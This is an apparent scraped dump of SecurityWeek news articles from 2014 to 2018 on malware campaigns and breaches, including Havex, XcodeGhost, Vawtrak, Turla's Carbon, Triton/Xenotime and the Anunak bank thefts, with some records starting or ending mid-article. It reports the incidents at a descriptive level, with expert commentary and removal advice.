According to the security firm, while the 64-bit Havex has only been spotted recently, it has been around for quite some time. In the campaign known as Dragonfly (Energetic Bear/Crouching Yeti), the threat actors appeared to be using only a 32-bit version of Havex since most of the systems they targeted ran the outdated Windows XP operating system. However, researchers at Trend Micro have spotted two Windows 7 infections in which the 64-bit version of the threat had been used. One of the files observed in the infection is TMPpovider023.dll (BKDR64_HAVEX.A), a component responsible for command and control (C&C) server instructions for downloading files and executing commands. The \"23\" in the file name represents the version of Havex. The file in question was initially compiled in October 2012 and designed to run on 64-bit operating systems. In version 29 of the malware, the 64-bit file was upgraded to a 32-bit Havex, experts said. \"The compile time of TMPprovider023.dll (v023) is earlier than any of the three other files, indicating that the 64-bit file pre-dates the other 32-bit files in this infection. In fact, standalone execution of the 32-bit module results to a file called TMPprovider029.dll, which definitely is v029 of the HAVEX RAT,\" Trend Micro explained in a blog post. Versions 23 and 29 of Havex appear to use the same infrastructure since they both communicate with the same C&C server. Researchers say there are currently four IP addresses communicating with the C&C server. In one of the infections spotted by Trend Micro, some of the malicious files, detected as BKDR_HAVEX.SM, were signed with a digital certificate in an effort to make them look like legitimate software. The digital certificate appeared to be signed by IBM, but in reality it was self-signed by the malware authors. \"While the HAVEX RAT has gone through several iterations—used in campaigns with ICS/SCADA and even pharmaceutical targets, nothing prevents it from being used again and again,\" Trend Micro said. \"ICS operators have to take note that the structure of the HAVEX binaries resemble much of what we see in common Windows malware – more so now that we’ve seen Windows 7 64-bit infections. It is thereby important to validate software being installed on endpoints within the environment, and to frequently monitor HTTP traffic.\" Havex and the Energetic Bear campaign were recently mentioned in an IT security report published by Germany's Federal Office for Information Security (BSI). According to the government agency, several German companies have been targeted in the cyber espionage operation. " }

It turns out that the process is associated with a piece of malware designed to mine for Monero (XMR) cryptocurrency. Researchers at Malwarebytes have analyzed the mshelper malware and while they haven’t been able to precisely determine how it’s distributed, they believe fake Flash Player installers, malicious documents or pirated software are likely involved rather than some other, more sophisticated, method. Experts noticed that the launcher, a file named pplauncher, is kept active by a launch daemon (com.pplauncher.plist), which suggests that the dropper likely had root privileges on the compromised system. The launcher was developed in Golang and it’s relatively large (3.5 Mb). “Using Golang introduces significant overhead, resulting in a binary file containing more than 23,000 functions. Using this for what appears to be simple functionality is probably a sign that the person who created it is not particularly familiar with Macs,” explained Malwarebytes’ Thomas Reed. Once the launcher creates the mshelper process, the compromised device starts mining for Monero cryptocurrency on behalf of the cybercriminals who distribute the malware. The miner itself is a legitimate and open source mining tool named XMRig. “This malware is not particularly dangerous, unless your Mac has a problem like damaged fans or dust-clogged vents that could cause overheating. Although the mshelper process is actually a legitimate piece of software being abused, it should still be removed along with the rest of the malware,” Reed said. Based on reports from victims, anti-malware products initially either did not detect the threat at all or they could not completely remove the infection – the malware reappeared after a reboot. Now that news of the malware has spread, security companies have likely updated their products to ensure complete removal. Alternatively, users can manually remove the malware by deleting these two files and rebooting their devices: /Library/LaunchDaemons/com.pplauncher.plist /Library/Application Support/pplauncher/pplauncher This is not the only cryptocurrency miner delivered recently to Mac users. In February, Malwarebytes reported that a Monero miner had been delivered through malicious versions of applications available through the MacUpdate website. " }
{ "_id" : { "$oid" : "5b27c3d76cefc41c844ab228" }, "Category" : "Malware", "Title" : "Industry Reactions to XcodeGhost Malware: Feedback Friday", "Address" : "https://www.securityweek.com/industry-reactions-xcodeghost-malware-feedback-friday", "Date" : "September 25, 2015", "Article" : "XcodeGhost, a piece of malware designed to target Apple users, has made a lot of headlines recently after researchers reported finding thousands of infected iOS applications. Attackers have modified Apple’s Xcode development platform and posted the malicious version on various Chinese websites knowing that many developers in that country prefer obtaining the software from third-party services due to slow download speeds when using Apple’s servers. The iOS and OS X apps created by developers with the rogue version of Xcode are injected with malicious code that allows attackers to perform various actions, such as collect information from infected devices and open arbitrary websites. Initially, researchers spotted only tens of XcodeGhost-infected iOS apps, but the latest reports indicate that the actual number of affected applications could be as high as 4,000.  Since many of the infected apps made their way to Apple’s App Store, the company has taken steps to remove the malicious programs and released an advisory containing instructions on how developers can ensure that the version of Xcode they are using is legitimate. Industry professionals contacted by SecurityWeek have shared thoughts on the sophistication and impact of the XcodeGhost attack, supply chain security, and possible prevention and protection methods. And the feedback begins... Ryan Smith, vice president and chief scientist, Optiv: \"XCodeGhost is one of the most interesting developments in malware. Normally malware authors have to write a seemingly benign application and put malicious code inside of the application. Instead, these malware authors wrote malicious code and injected it inside a compiler so that unwitting application developers included the malicious code inside their own programs. This type of attack was theorized at least as far back as 1984 by Ken Thompson of Bell Labs.  There are two attributes of this type of malware that complicate matters for the good guys. The first is that a standard inspection of the source code would reveal no malicious functionality. The malicious functionality isn’t added until the source code is translated into machine code and human reading of machine code rarely happens and few are qualified. The second issue is that since the malicious code is injected by the compiler, it’s easier for the malicious part of the code to change every time it’s embedded in a program. Many solutions to anti-virus involve identifying static portions of the malicious code, and if the malicious code changes by even a single bit it can throw off detection algorithms. These two things combined make these types of attacks difficult to combat.  Standard operational practices can easily prevent this type of malware from invading applications that you’re developing. All developers should submit their code to a centralized source code repository. There should be a dedicated build server. That build server should only use authentic versions of the compiler to compile the source code. The server should be inspected on an ongoing basis to ensure that it hasn’t been compromised and isn’t running vulnerable software. Additionally, the server should have extremely restricted access.” Yossi Naar, co-founder, Cybereason: “This whole situation - how the infection started and spread, underscores the reality that there's no anticipating the path of a compromise. Look at the infiltration path - fooling developers into downloading a modified development environment which injects malicious code into apps they build ­ a lot of effort went into building that trap, it's a sophisticated piece of social engineering. Clearly, it's a wide net attack, as it's almost impossible to reach a particular target using this method. This is consistent with Chinese attacks - they tend to be designed for high volume data collection rather than any specific operational goal. Data gathering and controls are not the means but the end itself, possibly enabling future data extraction from compromised target.  As far as how to prevent something like this from occurring: I'm not sure this scenario was preventable, given the bigger picture (China has slow download speeds so developers create workarounds) - that is beyond Apple's control. As for protecting the supply chain: Can you really expect to trust everyone in the chain? Can you validate every USB keyboard that every one of your suppliers uses? Every piece of development software? Trusted environments are a myth - we need to assume that anything and everything can be compromised and focus more of our attention on detecting signs that such a compromise has taken place.” Alex Cox, Director, RSA-FirstWatch Global: “[In the case of Apple devices], infecting individual phones is extremely difficult, as the vendor controls what can and can’t be installed on a phone. So an attack has to be performed higher in the distribution chain. Mobile malware has been a specter for years now, and it’s logical to see this sort of attack, especially when compared to the maturation of other aspects of the threat environment. [...] The other important thing to consider is these attacks compound themselves. If I’m able to compromise a mobile app development platform and get it widely distributed, with apps hosted in an official app store followed by thousand of downloads, the amount and types of information and credentials I’m able to access then spread widely. Which leads the attacker to additional information/compromises/attack possibilities and platforms.  Ultimately, detection of this sort of attack is a combined effort with both hard and soft approaches. Mobile device vendors need to increase their inspection capabilities for submitted apps infected with malware, and corporations need to consider the implications of mobile devices on their network, making sure they have the pervasive network visibility to understand when *any* network device is operating outside the norm while on the corporate network. This also needs to tie into a corporate policy that governs the acceptable use of mobile devices for corporate business. Unfortunately, the common consumer is completely at the mercy of the mobile device vendor that controls the app store. If their game is not on, the chance that the consumer will know a problem is occurring is slim to none.” Lance Cottrell, Chief Scientist for Passages, Ntrepid Corporation: “The XcodeGhost attack on applications in Apple’s iOS store is impressive for its sophistication. Rather than creating their own malware, the attackers were able to trick developers into incorporating malware into their apps. The big trend now is towards launching attacks upstream of the intended victim. In this case the attack focused on application developers to deliver malware rather than trying to deliver it directly. It is similar to malvertising attacks on small companies providing ads to big ad networks, or the Target attack that came in through an HVAC contractor network.  The attack shows both the vulnerability and strength of the walled garden approach to security. Apple failed to identify the malware before placing the applications into the store. Detection is incredibly difficult, so this should not be a huge shock. Fortunately, once identified, Apple is able to quickly remove the malware from every iOS device on the planet. The window of opportunity for the attackers is minimized.  Mass attacks like this are much less concerning than highly targeted attacks. Integrated attacks looking for generic access and information are typically more of an annoyance than a crisis for businesses. Targeted attacks are much harder to detect and are crafted for maximum benefit and/or damage. The recent $1 Million exploit bounty by Zerodium shows just how much these can be worth. The likely buyer for such an exploit would be a criminal or a government. In neither case would it be used in a mass attack but rather kept secret and used for maximum impact against carefully selected targets.” Rob Kraus, Director of Security Research and Strategy, Solutionary: “When approaching both mobile and traditional desktop application development, developers should always verify the source and integrity of application code that is implemented into a product, whether it is a software library, modules or frameworks. In the fast-moving world of application development, with a strong focus on reusing or leveraging existing code, it is often convenient to reuse or import existing code to help reduce development timelines. However, this has its inherent risks. Organizations often do not review third-party or their own code for security issues. All too often, developers blindly trust that code will perform as advertised without thought of what the security impact could be. What could go wrong there?  In the case of Xcode, the developers may have been able to identify the Xcode package was not indeed legitimate if they compared the source checksums against the list of official Xcode download sites. Probably all too simple of a step, but who wants to verify checksums when you can just jump in and start coding, right? Perhaps, it may be better served to implement security checks and validation of third party code while progressing the application through the development lifecycle? [...] The real question I have for developers today: Has this news changed anything you're doing today about how you adjust your practices? What are you doing today to make sure your current application do not have similar issues? And finally, what are you doing to ensure your applications aren't susceptible to these types of attacks in the future?” Elad Yoran, Executive Chairman, KoolSpan: \"The XcodeGhost attack on Apple's users and App Store reminds us that adversaries are patient and able to hit targets indirectly by hijacking software supply chains. Mobile platforms like iOS have very different attack surfaces compared to PCs, meaning that in some cases targeting developers might offer the fastest way to gain a foothold in coveted app markets and users' devices.  Many CISOs are likely concerned with the widely-varying published figures on the number and types of affected apps. At a time when it's all too easy for users to adopt almost any app for business purposes, there is clearly a scramble underway to confirm which apps are compromised and whether simply deleting them is the quickest fix. The XcodeGhost saga's quiet exploitation and sudden rise offer powerful lessons. Users of phone, messaging and communications apps, in particular - which are entrusted with sensitive behavior and information - should press developers to explain who stands behind the code and their software security practices.\" John Prisco, CEO, Triumfant: “Apple has been brilliant at maintaining the purity of the brand and until relatively recently, their closed off development community and rigorous control over applications have been enough to provide additional protections against malicious attacks. However, the genie is out of the iBottle. Hackers are a reality and malware is inevitable. This development is just one example of what will happen when the world’s largest smart device manufacturer won’t let security professionals protect its users.  Google and Android allow a certain level of collaboration where security professionals can conduct analysis with where is matters – with operating system-level interrogation and anomaly detection. You cannot do this with Apple IOS. You’re blocked off because Apple does not open their OS up to the security community thus, there is no way to develop a guardian for the operating system. Apple is no longer infallible and it’s important that Apple to realize this for itself.” Bill Anderson, Chief Product Officer, OptioLabs: “Some clever hackers managed to get one level below where security checking is normally done. Instead of hacking the apps after they were published, these folks did something very sneaky: they modified and republished the iPhone development toolset called Xcode so that it inserted some of the hacker’s code in unsuspecting app developers iPhone Apps.  These developers went on to submit their applications to Apple for publishing in the App store, and the apps were approved as non-malicious. There are two interesting observations here: 1. Apple’s app vetting procedure did not catch this malware. This is of moderate significance. There have been very few malicious apps published to the iTunes store, reportedly, until now. It is not because hackers have not tried before, but rather that Apple has been able to detect and deny them access. Something has changed. It appears the new malicious software was able to hide from Apple’s analysis. 2. The unsuspecting developers should have been more discerning about where they got their tools. There was a social engineering win for the bad guys here in that they slipped under the developer’s normal level of caution. Credible App developers did not realize that the bad guys could substitute another toolset for the real one.  This could have happened before and we might not know about it. The incident shows that clever malware can make it through Apple’s current vetting system if it is delivered by a trustworthy app. A particularly clever group of hackers (or an intelligence agency) could have introduced subtle malware to other applications by subverting other development tools. How would the average developer know if his toolset is trustworthy or modified? This is an aspect of software development that deserves further consideration.” Vikram Phatak, CEO, NSS Labs: \"Don't disable Apple's security. Apple has a superior ecosystem from a security standpoint. The attacks against Apple demonstrate the lengths that attackers will go to to infect an iPhone. The fact that Apple’s App store was delivering infected Apps is only news because after six years this is the first time it has ever happened. An Android malware outbreak is regular occurrence, and therefore not newsworthy.” Chris Wysopal, CTO and CISO, Veracode: “Apple has a massive install base, making it an attractive target for an attacker. In recent years it has seemed that the problem of mobile malware was bigger for Android than for iOS. The more testing and rigorous developer enrollment required before an iOS app can be published has always been considered to be the reason for this difference, yet in this case it seems to have fallen short. One very interesting aspect of this incident is that that the developers of the apps had no knowledge that their own code was being used to carry malware – it was the modified development environment (Xcode) that introduced the payload.  While enterprises need to adjust their MDM systems to reflect the potential of infected apps already being in their environment quickly, this case highlights the fact that developers need to start paying attention to security. However functionally perfect the code may be this is not a reflection on how secure the resulting app is. It’s critical that developers test what they are actually providing before releasing that app to the world. Analyzing the compiled code for vulnerabilities and malware using technologies such as binary static assessment and behavioral analysis to detect if malware has been injected between development and distribution should be mandatory before apps are ever published.” Gavin Reid, Vice President of Threat Intelligence, Lancope: \"Before this unfortunate incident the Apple App Store had the industry-leading track record releasing more than a million apps with only 5 known bad. This is due to their strong application verification process - contrast that with open Android policy resulting in daily malware. In this case there is little the user can do to protect itself. The fix for this is better care from the application developers to security and better verification from Apple. Apps like WeChat are used all over the world and there are people running apps developed in China everywhere.”  Due to internet restrictions and longer download times - people in China are used to using local services. This should be a wakeup call for software developers to really pay attention to their source materials. Mostly US and European developers download Xcode directly from Apple making a repeat of the same problem unlikely.” Paco Hope, Software Security Consultant, Cigital: “Attacks like The Ken Thompson hack (in this case against iOS apps) show how after-the-fact security is very limited in what it can realistically address. Analyzing binaries after they are built or penetration testing web and cloud apps after they are deployed provides limited assurance against vulnerabilities that are egregious and obvious. Secure software begins earlier, like when it is designed and developed. And there are no silver bullets—no tools that simply take care of the problem so that the people don’t need to do it themselves. It is important to incorporate security throughout the development process, right down to the provenance and selection of the development toolchain itself.” " }

Dubbed SYSCON, the malware is being distributed through malicious documents containing macros. All of these documents mention North Korea and appear to be targeted at individuals connected to the Red Cross and the World Health Organization. The use of an FTP server for C&C is rather unusual for a botnet, thus possibly slipping unnoticed by administrators and researchers. While this is a clear advantage, the fact that it leaves traffic open for monitoring is a great downside. Trend Micro also discovered that SYSCON’s authors made a coding mistake that resulted in the backdoor sometimes executing the wrong commands. The documents carrying the malware feature two long strings, with Base64 encoding using a custom alphabet, a technique used to deliver the Sanny malware family in late 2012. Sanny too leveraged relatively unusual techniques for C&C, had a similar structure, and used an identical encoding key, which could suggest that the same threat actor is behind the new backdoor. The Base64 strings are cabinet files containing the 32-bit and 64-bit versions of the malware, with the appropriate one (based on OS) being extracted into the %Temp% folder, after which one of the files in the cabinet (uacme.exe) is executed. The executed file determines the operating system version and either directly executes a BAT file or injects a DLL into the taskhost(ex) process to execute the BAT without triggering a UAC prompt. The BAT file was designed to inject the main malware module and the configuration file into %Windows%\\System32, and to achieve persistence. For that, it configures a new COMSysApp service, adds the service parameters into the registry, and starts the service. It also deletes all previously created files in the %Temp% directory. After execution, the malware gets the computer name and uses it as an identifier, then logs into the FTP server using credentials stored in the configuration file. The attackers use the byethost free FTP service provider, the researchers discovered. On the FTP server, commands are stored in .txt files, either meant to be processed by all bots or by specific victim computers. After processing a command, the backdoor lists all currently running processes, then sends the data to the server. Transmitted files are generally zipped and encoded with the same custom Base64 encoding used earlier. Supported commands include: copy file to temp.ini, pack it to temp.zip, encode and upload; pack file to temp.zip, encode and upload; delete config file, write string to the new config file; put file to the given path on infected system; execute command but don’t report back; and execute downloaded file, among others. The command processing loop contains what appears to be a typo or mistake, the researchers say. They explain that, while the malware treats the commands as strings in wide character format, a parameter in one of the functions has an incorrect file name, thus preventing the process from executing. “It is interesting to see something atypical, like C&C communication via FTP. While the malware authors probably used this method in an attempt to avoid security solutions inspection and/or blocking, they may not have realized this would make it very easy to monitor their actions and victims’ data,” Trend Micro concludes.

Also known as NeverQuest and Snifula, Vawtrak injects a DLL into browser processes. When the targeted URLs are visited by an infected user, the malware inserts extra code into the web page. That extra code is used for a number of reasons, including bypassing two-factor authentication, a new paper from Sophos notes.   \"The updates are mostly about disguising where the malware connects when it \"calls home\" to fetch its instructions on what to do next,\" blogged Sophos James Wyke. \"Additionally, the way that Vawtrak communicates with its so-called command-and-control (C&C) servers has been adapted so that the malware's traffic looks less suspicious. We have also observed new configuration files being deployed, and an interesting trend in the commands sent back by the C&C servers when an infected computer first checks in.\"   More specifically, the updates included how the list of command and control server addresses are stored inside the Vawtrak program file. In addition, the malware makes heavy use of pseudorandom numbers produced by a Linear Congruential Generator (LCG) algorithm that scrambles the data it contains.   \"Vawtrak also waits for a browser process to be launched before making any outbound C&C requests, so that it never generates traffic when you wouldn't expect it,\" Wyke blogged.   Targets of the malware have included customers of banks all around the world, including the U.S., Poland and Germany. According to Sophos, Vawtrak was the second-most popular malware distributed by Web-based exploit kits during September and November.   Don Jackson, director of threat intelligence at PhishLabs, blogged that the attackers appear to be responding to the attention they are getting from malware analysts and investigators by adopting modern anti-analysis tactics such as virtual machine detection and anti-debugging methods designed to frustrate forensic analysis.   \"Vawtrak targets banks in a wide range of different countries, including some that are highly unusual to see banking malware target, and also targets companies from other industries that are off the radar of typical banking malware families,\" according to Sophos report. \"Combined with the use of specific campaign IDs, it’s evident that the Vawtrak operators are setting up the botnet to deliver Crimeware-as-a-Service, rather than following a more traditional kit-selling model that older families such as Zeus or SpyEye once employed.\"   \"This model allows specialization,\" the report continues. \"Aspects of the operation can be divided into distinct areas that expert members of the team can work on independently. For example, German language web injects can be handled by German speaking team members, code that is designed to bypass two-factor authentication can be written by a different team than more simple code that asks for extra information not normally required, and the stolen data can be similarly divided.\" " }

Turla has been active since at least 2007 and is believed to be responsible for several high-profile attacks, including the ones aimed at Swiss defense firm RUAG and the U.S. Central Command. The group is also known as Waterbug, KRYPTON and Venomous Bear, and some of its primary tools are tracked as Turla (Snake and Uroburos) and Epic Turla (Wipbot and Tavdig). Carbon, also known as Pfinet, is another tool used by the group and ESET has described it as a lite version of Uroburos. Carbon is a second-stage backdoor that is typically deployed after the reconnaissance phase of an attack, which involves malware such as Tavdig. Carbon was also used in the attack aimed at RUAG. According to ESET, Carbon has several components, including a dropper, a command and control (C&C) communications element, an orchestrator, and a loader that executes the orchestrator. These components are mostly DLL files, except for the loader, which is an EXE file. The security firm has identified several versions of Carbon compiled last year; the most recent has a compilation date of October 21, 2016. ESET pointed out that Turla has been making changes to its tools once they are exposed. In the case of Carbon, file names and mutexes have been modified in version 3.8, released in the summer of 2016, compared to version 3.7, which had been used since 2014. The main component of the Carbon framework is the orchestrator, which is used to inject the C&C communications library into a legitimate process, and dispatch the tasks received via the C&C library to other computers on the network. Before C&C communications are initiated, the malware checks the infected system for the presence of packet capture software, such as Wireshark and Tcpdump. In addition to changed file names and mutexes, ESET said the newer versions of Carbon use more encryption, including for files and the names of modules, functions and processes. In February, Kaspersky Lab revealed that the Turla group had started using a new piece of JavaScript malware to profile victims. " }
{ "_id" : { "$oid" : "5b27c3da6cefc41c844ab22d" }, "Category" : "Malware", "Title" : "Large Number of iOS Apps Infected by XcodeGhost", "Address" : "https://www.securityweek.com/large-number-ios-apps-infected-xcodeghost", "Date" : "September 23, 2015", "Article" : "Researchers continue to analyze XcodeGhost, a recently discovered threat that has been used by malicious actors to infect legitimate iOS applications. Palo Alto Networks initially reported that 39 malicious iOS apps had been identified on the Apple App Store. Chinese security firm Qihoo360 later said it had spotted 344 infected apps, while Appthority’s mobile threat team reported finding 476 apps. However, the actual number could be in the thousands. The jailbreak team Pangu discovered more than 3,400 apps, while FireEye reported uncovering over 4,000 infected pieces of software on the App Store. While the threat appears to mainly impact Chinese developers, some of the infected apps, such as WeChat, are used all across the world. Apple has started removing the infected apps from the App Store, but Palo Alto Networks warned on Monday that some of them had still been available. XcodeGhost is capable of injecting malicious code into legitimate iOS and OS X applications through a modified version of Apple’s Xcode development platform that has been distributed via third party websites such as Baidu. While the number of infections spiked only recently, experts say the rogue Xcode installers have been around since March. Once infected, the applications allow attackers to collect information on the device and other apps, and open arbitrary URLs. The command and control (C&C) servers used for controlling the malware and for storing the harvested data have been hosted on Amazon Web Services. Palo Alto Networks pointed out on Monday that XcodeGhost uses HTTP requests encrypted with the DES algorithm in ECB mode for communications with the C&C server. However, the encryption key can be easily obtained, which creates opportunities for man-in-the-middle (MitM) attackers. “There’s a vulnerability in the infected iOS apps whereby the malicious code in them can be controlled by any man in the middle. By exploiting this vulnerability, an attacker can construct any URL in any scheme and control infected apps to open, or prompt an alert dialog for further attacks,” Palo Alto’s Claud Xiao explained in a blog post. Amazon has shut down the C&C servers and Apple has published an advisory containing instructions on how developers can determine if the Xcode version they are using is legitimate or counterfeit. Baidu has also removed malicious Xcode installers from its file sharing service, but the anti-censorship organization GreatFire has warned that attackers could also distribute rogue Xcode installers via the popular Chinese download manager Xunlei. Palo Alto Networks initially reported that XcodeGhost-infected apps could be used to display iCloud phishing prompts. After a closer analysis, experts determine that this is only possible if a few lines of code are changed. The samples spotted so far can only be used for phishing via a feature in the malware that allows the attackers to open arbitrary URLs on infected devices. “The framework itself contains no code to display login prompts or alerts of any kind that could be used to phish credentials (the alert has no field for text input). The only way to launch a phishing attack using this framework would be to send the response to open a URL pointing to a malicious website,” explained researchers at Appthority. Appthority has also pointed out that the samples identified so far behave more like adware or tracking frameworks rather than actual malware. While some experts have noted that XcodeGhost poses a serious threat to organizations, particularly if the modified Xcode versions are used to develop internal applications, Appthority believes that the actual impact to device and enterprise security is low. On the other hand, this incident demonstrates that it is possible to infect multiple popular apps in the App Store and bypass Apple’s review process, the security firm said. " }

The company has provided only little information about the incident, but says it’s working with law enforcement and third-party forensics firms to investigate the breach. Sonic said it delayed notifying customers of the intrusion at the request of law enforcement. “Sonic Drive-In has discovered that credit and debit card numbers may have been acquired without authorization as part of a malware attack experienced at certain Sonic Drive-In locations,” the company stated. Customers who used their cards at Sonic Drive-In locations this year are being offered 24 months of free fraud detection and identity theft protection services via Experian. Consumers can enroll until December 31. While it’s unclear which locations were hit by the malware attack and how many customers are impacted, security blogger Brian Krebs last week learned of a cybercrime marketplace selling a batch of 5 million cards, at least some of which appear to come from Sonic’s systems. The cards were put up for sale on September 18, but IBM researchers said the first batch appeared on a different cybercrime service that checks card validity for fraudsters on September 15, which suggested that the attackers had been collecting card data on an ongoing basis. The data offered on the cybercrime website had been offered for $25-$50 per card. Interested parties could purchase information from cards owned by individuals in a certain state or city — fraudulent transactions made in the area of the victim are less likely to trigger any alarms. Sonic’s shares dropped 2 percent to $24.74 on Wednesday. “Will customer loyalty be shaken? If the past as with the Wendy’s breach is prologue, then the answer is a qualified maybe, and if so, then only slightly,” Robert W. Capps, VP of Business Development at NuData Security, told SecurityWeek after the breach came to light. “However, this - coupled with the tsunami of recent breaches - might just be the game changers that lead US Federal authorities to better protect the data collection, processing and storage of customer data,” Capps added. The list of major restaurant chains that informed customers of a payment card breach in the past year includes Wendy’s, Cicis, Arby’s, Chipotle, Shoney’s, and Noodles & Company. " }

The actor, which industrial cybersecurity firm Dragos tracks as Xenotime, is believed to have been around since at least 2014, but its activities were only discovered in 2017 after it targeted a critical infrastructure organization in the Middle East. The attack that led to the cybersecurity industry uncovering Xenotime was reportedly aimed at an oil and gas plant in Saudi Arabia. It specifically targeted Schneider Electric’s Triconex safety instrumented systems (SIS) through a zero-day vulnerability. The targeted organization launched an investigation and called in FireEye's Mandiant after the SIS caused some industrial systems to unexpectedly shut down. Researchers believe the shutdown was caused by the attackers by accident. Dragos has also analyzed the initial Triton/Trisis incident and more recent attacks launched by Xenotime. The company says the group has targeted organizations globally, far outside the Middle East. The security firm has not shared any details on present attacks, but it did note that the hackers are active in multiple facilities, targeting safety controllers other than Triconex. Some researchers believe Iran is behind the attacks, but Dragos has not shared any information on attribution. The company did point out that it has not found any links between Xenotime and other known groups. “Dragos assesses with moderate confidence that Xenotime intends to establish required access and capability to cause a potential future disruptive or even destructive event,” the company wrote in a blog post. “Compromising safety systems provides little value outside of disrupting operations. The group created a custom malware framework and tailormade credential gathering tools, but an apparent misconfiguration prevented the attack from executing properly. As Xenotime matures, it is less likely that the group will make this mistake in the future.” Dragos has been tracking the activities of several threat actors that target industrial control systems (ICS). The company has published brief reports for three of the seven hacker groups it monitors, including the Russia-linked Allanite, which targets electric utilities in the US and UK, and Iran-linked Chrysene, which has attacked ICS networks in the Middle East and the UK.

The method of using scanners to jump the air gap was first summarized back in 2014 at the Black Hat Europe conference by Adi Shamir, professor of Applied Mathematics at the Weizmann Institute of Science and one of the inventors of the RSA algorithm. Shamir along with Ben Nassi and Yuval Elovici of the Ben-Gurion University of the Negev in Israel have now published a detailed research paper on this attack method. The experiments conducted by the experts show that an attacker can send commands to a piece of malware on an isolated machine by pointing a light source at a connected flatbed scanner that has its lid open from outside the building housing the device. The malware can be programmed to initiate scans at a specified time and date when the attacker will start sending the commands. Researchers pointed out that only the first scan date needs to be set as subsequent dates can be supplied in each attack. The commands are transmitted as pulses from a laser or a different light source – a 1 bit is transmitted when the light source is on, and a 0 bit is sent when it’s off. The light source can be a visible laser or an invisible infrared laser, which makes the attack stealthier. The light source can be attached to a stand or a drone. The laser attack works if there is a clear line of sight from the outside of the building to the scanner. If the view is blocked by a curtain or a wall, the attacker can remotely hijack a smart bulb located in the same room as the targeted scanner and use it to send the signals. When Shamir first mentioned the attack method, he only described a scenario involving a laser attached to a drone. In the paper they published now, the researchers also detailed an attack involving smart bulbs, which have been known to be vulnerable to remote hacking. In their experiments, the experts flew a drone to the third floor of an office building at a distance of 15 meters (50 feet) from the scanner. Using a transmission rate of 50 milliseconds for each bit, they managed to send the command “d x.pdf,” which can be a command for deleting a file named “x.pdf,” in 3.2 seconds. A stronger laser allowed them to conduct a successful attack from 900 meters away (0.55 miles). In the smart bulb attack scenario, which involves hijacking the bulb and commanding it to turn on and off to transmit 1 and 0 bits, instructions were sent to the malware from a car passing by the targeted building. In this experiment, researchers simulated a ransomware attack, where the threat actor sent four bytes of data in the form of a “en q” command (i.e. encrypt directory q). The attack was carried out in four seconds at a 100 millisecond transmission rate. Researchers pointed out that this is a two-way communication channel as the malware can use the scanner itself to emit visible light pulses that can be captured and decoded by a video recorder mounted on a drone. Videos have been published to show both the laser and smart bulb attacks:   This is not the only method devised by researchers for jumping air gaps. Over the past months, they have detailed several techniques, including ones involving HDD activity LEDs, USB devices, the noise emitted by hard drives and fans, and heat emissions. " }

According to the report, the group - known as 'Anunak' - focuses their frauds on the corporate network, targeting internal payment gateways and internal banking systems. In this way, they steal money from the banks and payment systems themselves and not from the banks' customers. In addition to this activity, the gang has also compromised media groups and other organizations for the purpose of industrial espionage and possibly to obtain a trading advantage on the stock market. In cases where the group got access to government agency networks, their aim is believed to be espionage-related, the researchers report.      All totaled, the group is known to have hit more than 50 Russian banks, five payment systems and 16 retail companies. Most of the retail companies are outside of Russia, but no U.S./EU banks are known to have been attacked.   \"We have seen criminals branching out for years, for example with POS malware,\" said Andy Chandler, Fox-IT’s SVP and general manager, in a statement. \"Anunak has capabilities which pose threats across multiple continents and industries. It shows there’s a grey area between APT and botnets. The criminal’s pragmatic approach once more starts a new chapter in the cybercrime ecosystem.\"   On average, the group stayed on internal networks 42 days before money was stolen, according to the report.   \"As a result of access to internal bank networks the attackers also managed to gain access to ATM management infrastructure and infect those systems with their own malicious software that further allows theft from the banks' ATM systems on the attackers command,\" according to the report. \"Since 2014 the organized criminal group members began actively taking an interest in US and European-based retail organizations. While they were already familiar with POS malware and compromising POS terminals, the widespread media attention around the Target breach and other related breaches were the reason for this move. While the scale of breaches in this industry is still relatively low, with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becoming a lucrative endeavor for this group.\"   As with many campaigns, the attackers use spear phishing emails to penetrate their targets. Since August 2014, the group began to create their own botnet for blasting out emails.   \"The first successful bank robbery was committed by this group in January 2013,\" according to the report. \"In all first cases the attackers used the program RDPdoor for remote access to the bank network and the program “MBR Eraser” to remove traces and to crack Windows computers and servers. Both programs were used by the members of the Carberp criminal group under the guidance of a person named Germes. To reduce the risk of losing access to the internal bank network the attackers, in addition to malicious programs, were also used for remote access legitimate programs such as Ammy Admin and Team Viewer.\"   \"Later the attackers completely abandoned from usage of RDPdoor and Team Viewer,\" the report continues. \"In addition to banking and payment systems, hackers got access to e-mail servers to control all internal communications. This approach allowed them to find out that the anomalous activity in the bank network was identified, what technique was used to identify this activity and what measures the bank employees took to solve the problem. Email control was successfully installed regardless of used email system, MS Exchange or Lotus. This approach allowed them to take countermeasures that created for bank and payment system employees the feeling that the problem had been solved.\"   The complete report can be read here.    " }

XcodeGhost, which has mainly impacted China, was first analyzed by Chinese experts and later by researchers at network security company Palo Alto Networks. Malicious code has been unwittingly embedded into legitimate applications by developers using rogue versions of Xcode, Apple’s integrated development environment (IDE) for creating OS X and iOS software. Malicious actors have been counting on the fact that many iOS and OS X developers in China download Xcode from third party websites because downloading the 3Gb installer from Apple’s servers can take a long time. While the malicious Xcode packages can be used to infect both OS X and iOS apps, so far researcher have only spotted trojanized iOS applications. According to Palo Alto Networks, 39 malicious iOS apps made their way to the official App Store without being flagged by Apple’s security systems. Reuters reported over the weekend that the Chinese security firm Qihoo360 had spotted more than 300 infected applications. Apple said it had removed infected apps from the App Store, but it’s unclear exactly how many such pieces of software have been identified by the tech giant. The list of trojanized programs includes some highly popular products installed by hundreds of millions of users, such as the voice and text messaging service WeChat. Tencent Holdings, the company behind WeChat, has assured customers that the latest version of the app is not affected. Initially, the malicious applications were only observed uploading device and app information from infected iPhones and iPads to a command and control (C&C) server. However, a closer analysis revealed that the malware can also be remotely instructed to display phishing pages, read and write data in the clipboard, which is also useful for sensitive data theft, and hijack the opening of specific URLs, Palo Alto Networks said. One developer has already reported spotting iCloud phishing attempts conducted by the malware. XcodeGhost alters applications developed with the rogue versions of Xcode through Core Services, a component used by many apps since it contains fundamental system services. “XcodeGhost implemented malicious code in its own CoreServices object file, and copies this file to a specific position that is one of Xcode’s default framework search paths. Hence, the code in the malicious CoreServices file will be added into any iOS app compiled with the infected Xcode without the developers’ knowledge,” Palo Alto Networks researchers explained in a blog post. The network security company has pointed out that threat actors don’t necessarily need to trick developers into using their Xcode packages to distribute trojanized apps. They can also write OS X malware designed to drop a malicious object file into a directory of a legitimate Xcode installation. Unlike other types of threats, compiler malware can also affect enterprises that are cautious about the applications installed on employee devices. That’s because in the case of compiler malware the malicious code can end up in internally developed 